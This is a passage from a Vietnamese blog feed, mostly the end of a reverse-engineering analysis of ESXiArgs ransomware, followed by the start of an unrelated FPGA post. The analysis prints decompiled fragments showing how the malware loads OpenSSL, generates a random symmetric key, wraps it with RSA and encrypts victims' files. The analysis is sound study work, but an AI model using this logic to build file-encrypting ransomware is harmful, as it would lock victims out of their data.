</span></span><span style="display:flex;"><span>          <span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_private_decrypt&#34;</span>);
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_private_decrypt</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">9</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>          <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">dlsym</span>(<span style="color:#e06c75">plibssl</span>,<span style="color:#98c379">&#34;RSA_size&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lRSA_size</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">10</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>            <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>              <span style="color:#e06c75">local_4c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Các đoạn code này cũng sẽ làm việc giống như đoạn trước. Tức là hàm này sẽ lấy các hàm khác nhau bằng cách sử dụng linker để sau này nó có thể sử dụng các hàm đó. Nhìn vào đoạn code này thì mình có thể đoán được chương tình này sẽ làm những gì.</p>
<p>Nó lấy <code>PEM_read_bio_RSA_PUBKEY</code> để đọc khóa công khai RSA, nó lấy <code>PEM_read_bio_RSAPrivateKey</code> để đọc khóa bí mật RSA, nó lấy <code>RAND_pseudo_bytes</code> để tạo byte random, các byte này chắc sẽ được sử dụng cho việc mã hóa các file, vân vân. Từ mấy hàm này thì mình có thể đoán là nó đang load các hàm liên quan đến thuật toán mã hóa <strong>RSA</strong> để nó có thể sử dụng cho việc mã hóa.</p>
<p>Đó là hàm <code>init_libssl()</code>, nó sẽ load các hàm từ <code>libssl</code> để sau này chương trình này có thể sử dụng. Mình sẽ quay lại hàm <code>main</code> và tiếp tục phân tích code trong hàm đó.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">get_pk_data</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">1</span>],<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_18</span>);
</span></span></code></pre></div><p>Tiếp theo, chương trình này sẽ gọi hàm nữa gọi là <code>get_pk_data()</code>. Mình đoán là <code>pk</code> là viết tắt cho <em>public key</em>, nghĩa là khóa công khai, bởi vì chương trình này đang cần mã hóa file và khóa công khai sẽ được sử dụng cho việc mã hóa file trong mã hóa bất đối xứng.</p>
<p>Nhưng để có thể chắc chắn thì mình sẽ mở hàm đó lên và xem nó làm những gì.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read</span>(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__fd</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_pk_file&#34;</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ đọc 1 file <code>param_1</code>, File này sẽ là <code>argv[1]</code> và nó sẽ là file khóa công khai.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">2</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0xffffffffffffffff</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [end]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> <span style="color:#c678dd">if</span> (<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;get_pk_data: key file is empty!&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">3</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ dùng <code>lseek()</code> để đi đến cuối file và kiểm tra xem file đó có trống hay không.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">pvVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>(<span style="color:#e06c75">__nbytes</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span><span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar1</span>;
</span></span><span style="display:flex;"><span><span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">lseek</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">_Var2</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;lseek [start]&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">4</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">read</span>(<span style="color:#e06c75">__fd</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">__nbytes</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">sVar3</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">DAT_0040841e</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">5</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">close</span>(<span style="color:#e06c75">__fd</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Đoạn này sẽ tạo 1 buffer với kích cỡ <code>__nbytes + 1</code> và đọc từ file khóa vừa mở vào buffer này, buffer này sẽ được gán vào <code>param_2</code>, rồi nó sẽ đóng file và trả về <code>main</code>.</p>
<p>Nhìn chung thì hàm <code>get_pk_data()</code> sẽ đọc file khóa công khai vào tham số thứ 2 của hàm. Thế thì mình sẽ đặt lại tên tham số này trong hàm <code>main</code> (hiện tại là <code>local_18</code>) thành <code>public_key_buffer</code>. Mình sẽ quay lại hàm <code>main</code> và tiếp tục phân tích.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">public_key_buffer</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_20</span>);
</span></span></code></pre></div><p>Tiếp theo chương trình sẽ gọi hàm <code>create_rsa_obj</code>. Hàm này chắc sẽ lấy <code>public_key_buffer</code> mà <code>get_pk_data()</code> vừa tạo, tạo 1 đối tượng RSA và gán đối tượng đó vào <code>local_20</code>.</p>
<p>Để kiểm chứng giả thuyết của mình thì mình sẽ phân tích code trong hàm này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">create_rsa_obj</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">long</span> <span style="color:#e06c75">lVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lBIO_new_mem_buf</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">0xffffffff</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;BIO_new_mem_buf&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_2</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lPEM_read_bio_RSA_PUBKEY</span>)(<span style="color:#e06c75">lVar1</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#d19a66">0</span>,<span style="color:#d19a66">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">lVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;PEM_read_bio_RSA_PUBKEY&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_2c</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_2c</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Bởi vì đoạn code này cũng khá ngắn và dễ hiểu nên mình sẽ đi qua đoạn code này nhanh. Mình thấy là nó gọi hàm <em>Basic I/O memory buffer</em> (hàm này sẽ tạo 1 cái buffer trong bộ nhớ) để tạo 1 buffer trong bộ nhớ để tạm thời chứa đối tượng RSA, nó sẽ tạo 1 đối tượng RSA từ <code>public_key_buffer</code> và nó gán cái đối tượng vào <code>param_2</code>, mà <code>param_2</code> trong trường hợp này sẽ là <code>local_20</code> ở trong hàm <code>main</code>.</p>
<p>Mình sẽ đặt tên lại cho <code>local_20</code> thành <code>rsa_key_object</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_file</span>(<span style="color:#e06c75">argv</span>[<span style="color:#d19a66">2</span>],<span style="color:#e06c75">rsa_key_object</span>,<span style="color:#e06c75">local_28</span>,<span style="color:#e06c75">local_30</span>,<span style="color:#e06c75">local_38</span>);
</span></span></code></pre></div><p>Tiếp theo trong hàm <code>main</code> là 1 hàm khá thú vị. Đây là hàm mã hóa. Mình có thể thấy là 1 trong những tham số của hàm này là <code>argv[2]</code>, đây là đường dẫn tới file. Hàm này cũng sẽ có 1 tham số nữa là <code>rsa_key_object</code>.</p>
<p>Mình sẽ phân tích code của hàm này và xem chương trình này mã hóa file như thế nào.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">local_10</span> <span style="color:#56b6c2">=</span> <span style="color:#56b6c2">*</span>(<span style="color:#e5c07b">long</span> <span style="color:#56b6c2">*</span>)(<span style="color:#e06c75">in_FS_OFFSET</span> <span style="color:#56b6c2">+</span> <span style="color:#d19a66">0x28</span>);
</span></span><span style="display:flex;"><span><span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">open_read_write</span>(<span style="color:#e06c75">file_to_encrypt</span>);
</span></span><span style="display:flex;"><span><span style="color:#c678dd">if</span> (<span style="color:#e06c75">local_3c</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#61afef;font-weight:bold">print_error</span>(<span style="color:#98c379">&#34;open_read&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">local_74</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Mình có thể thấy ở đoạn này thì nó sẽ mở file để đọc và viết. Nó đang đọc file vào biến <code>local_3c</code> thế nên mình sẽ đặt lại tên của biến này là <code>encrypt_file_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">local_38</span>,<span style="color:#d19a66">0x20</span>);
</span></span></code></pre></div><p>Ở đoạn này thì nó sẽ gọi hàm <code>get_stream_key()</code>. Mình đoán là hàm này sẽ tạo ra 1 khóa đối xứng. Mình thấy là nó có tham số là <code>0x20</code>, và bất cứ bội số của 16 hay 128 bit sẽ là 1 khóa stream đối xứng. Thế mình nghĩ là khóa đối xứng sẽ được sử dụng mã hóa đối xứng.</p>
<p>Biến <code>local_38</code> là 1 tham số của hàm này, thế nên mình đoán là nó sẽ là buffer cho khóa đối xứng. Mình sẽ đặt lại tên biến này thành <code>sym_key_buffer</code>.</p>
<p>Mình sẽ xem hàm <code>gen_stream_key()</code> có những gì:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5c07b">bool</span> <span style="color:#61afef;font-weight:bold">gen_stream_key</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">param_2</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRAND_pseudo_bytes</span>)(<span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">param_2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RAND_pseudo_bytes&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn tổng thể thì hàm này sẽ tạo ra 1 khóa đối xứng giả ngẫu nhiên. Tức là khóa đối xứng này là an toàn. Nếu như tác giả mã độc này dùng 1 cái seed tạo số random chọn trước hay 1 giá trị không random là khóa thì khóa này sẽ không an toàn và có thể bị phá.</p>
<p>Mình sẽ tiếp tục phân tích ở trong hàm <code>encrypt_file()</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">param_2</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_48</span>,<span style="color:#56b6c2">&amp;</span><span style="color:#e06c75">local_40</span>);
</span></span></code></pre></div><p>Ở đoạn này thì nó sẽ gọi hàm <code>rsa_encrypt()</code>. Mình sẽ vào phân tích code của hàm này.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">undefined4</span> <span style="color:#61afef;font-weight:bold">rsa_encrypt</span>(<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_1</span>,<span style="color:#e06c75">undefined8</span> <span style="color:#e06c75">param_2</span>,<span style="color:#e5c07b">int</span> <span style="color:#e06c75">param_3</span>,<span style="color:#e5c07b">void</span> <span style="color:#56b6c2">**</span><span style="color:#e06c75">param_4</span>,<span style="color:#e5c07b">int</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">int</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e5c07b">void</span> <span style="color:#56b6c2">*</span><span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">undefined4</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">if</span> (<span style="color:#e06c75">param_3</span> <span style="color:#56b6c2">&lt;</span> <span style="color:#e06c75">iVar1</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_size</span>)(<span style="color:#e06c75">param_1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">pvVar2</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">calloc</span>((<span style="color:#e5c07b">long</span>)<span style="color:#e06c75">iVar1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">pvVar2</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> (<span style="color:#56b6c2">*</span><span style="color:#e06c75">lRSA_public_encrypt</span>)(<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_2</span>,<span style="color:#56b6c2">*</span><span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">param_1</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">if</span> (<span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">==</span> <span style="color:#56b6c2">-</span><span style="color:#d19a66">1</span>) {
</span></span><span style="display:flex;"><span>      <span style="color:#61afef;font-weight:bold">print_error_ex</span>(<span style="color:#98c379">&#34;RSA_public_encrypt&#34;</span>,<span style="color:#d19a66">1</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">2</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#56b6c2">*</span><span style="color:#e06c75">param_5</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">iVar1</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">else</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#61afef;font-weight:bold">puts</span>(<span style="color:#98c379">&#34;encrypt_bytes: too big data&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">local_44</span> <span style="color:#56b6c2">=</span> <span style="color:#d19a66">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#c678dd">return</span> <span style="color:#e06c75">local_44</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nhìn qua thì mình có thể thấy là hàm này đang mã hóa khóa đối xứng sử dụng đối tượng RSA mà nó tạo ra từ trước. Mình có thể thấy là ở dòng <code>iVar1 = (*lRSA_public_encrypt)(param_3,param_2,*param_4,param_1,1);</code> thì <code>param_3</code> là <code>0x20</code> và <code>param_2</code> là <code>sym_key_buffer</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e06c75">iVar1</span> <span style="color:#56b6c2">=</span> <span style="color:#61afef;font-weight:bold">encrypt_simple</span>(<span style="color:#e06c75">encrypt_file_buffer</span>,<span style="color:#e06c75">param_3</span>,<span style="color:#e06c75">param_4</span>,<span style="color:#e06c75">sym_key_buffer</span>,<span style="color:#d19a66">0x20</span>,<span style="color:#e06c75">param_5</span>);
</span></span></code></pre></div><p>Tiếp theo thì chương trình này sẽ gọi <code>encrypt_simple()</code>. Mình đoán là nó sẽ sử dụng <code>sym_key_buffer</code> để mã hóa <code>encrypt_file_buffer</code>. Nó sẽ lấy khóa đối xứng và dùng nó để mã hóa file.</p>
<p>Nhìn trong hàm <code>encrypt_simple()</code> thì mình thấy là nó là hàm tính toán mã hóa. Thế nên giả định trước của mình là đúng.</p>
<p>Code còn lại sau đoạn này chỉ là xử lý lỗi và viết file đã mã hóa vào file cũ.</p>
<p>Nếu như mình muốn giải mã các file bị mã hóa thì mình cần sử dụng khóa bí mật. Mình sẽ cần lấy khóa đối xứng từ khóa bí mật và dùng khóa đối xứng đó để giải mã các file.</p>
<h1 id="kết-luận">Kết luận</h1>
<p>Đó là quá trình phân tích mã độc ESXiArgs của mình. Mình đã cố gắng đi qua các chi tiết quan trọng trong con mã độc này.</p>
<p>Điều mình thấy lạ về con mã độc này các thông tin debug vẫn còn trong file nhị phân này. Sau khi phân tích mã độc này thì mình thấy là nếu như mình là nạn nhân của con mã độc này thì mình cũng không thể làm gì để lấy lại file. Con mã độc này bắt buộc nạn nhân phải trả tiền bởi vì nó sử dụng mã hóa bất đối xứng cộng với khóa đối xứng random</p>
<p>Kể cả sau khi phân tích con mã độc này, mình cũng không có thông tin gì mà có thể giúp nạn nhân lấy lại file. 1 giả thuyết khá điên của mình là tác giả mã độc để các thông tin debug lại trong file nhị phân để &ldquo;flex&rdquo;, bởi vì họ biết là mã độc của họ, một khi đã mã hóa 1 file thì sẽ phải cần khóa bí mật để giải mã. Và họ là người duy nhất có khóa bí mật đó.</p>
]]></content>
        </item>
        
        <item>
            <title>Dự án máy tính 8-bit trên FPGA</title>
            <link>https://namberino.github.io/vi/posts/2024/02/d%E1%BB%B1-%C3%A1n-m%C3%A1y-t%C3%ADnh-8-bit-tr%C3%AAn-fpga/</link>
            <pubDate>Mon, 26 Feb 2024 10:01:26 +0700</pubDate>
            
            <guid>https://namberino.github.io/vi/posts/2024/02/d%E1%BB%B1-%C3%A1n-m%C3%A1y-t%C3%ADnh-8-bit-tr%C3%AAn-fpga/</guid>
            <description>&lt;p&gt;Máy tính là 1 công cụ khá là thần bí với đa số mọi người. Mình đảm bảo là nếu như mình hỏi random 1 người trên đường về cách máy tính hoạt động kiểu gì thì có khả năng rất cao là họ sẽ trả lời là &amp;ldquo;&lt;em&gt;Tôi không biết&lt;/em&gt;&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;Mình cũng từng là 1 người như thế, mình có ý tưởng mơ hồ về cách máy tính hoạt động: lập trình code, dịch code xuống mã nhị phân, máy tính đọc mã nhị phân rồi chạy. Nhưng mà mình không hiểu rõ máy tính làm gì để dịch code xuống mã nhị phân và làm gì với mã nhị phân để chạy chương trình. Thế nên mình quyết định là mình sẽ tìm hiểu về cách máy tính hoạt động. Và cách tìm hiểu về 1 cái gì đó tốt nhất là &lt;em&gt;tự tay&lt;/em&gt; làm cái gì đó.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<p>Máy tính là 1 công cụ khá là thần bí với đa số mọi người. Mình đảm bảo là nếu như mình hỏi random 1 người trên đường về cách máy tính hoạt động kiểu gì thì có khả năng rất cao là họ sẽ trả lời là &ldquo;<em>Tôi không biết</em>&rdquo;.</p>
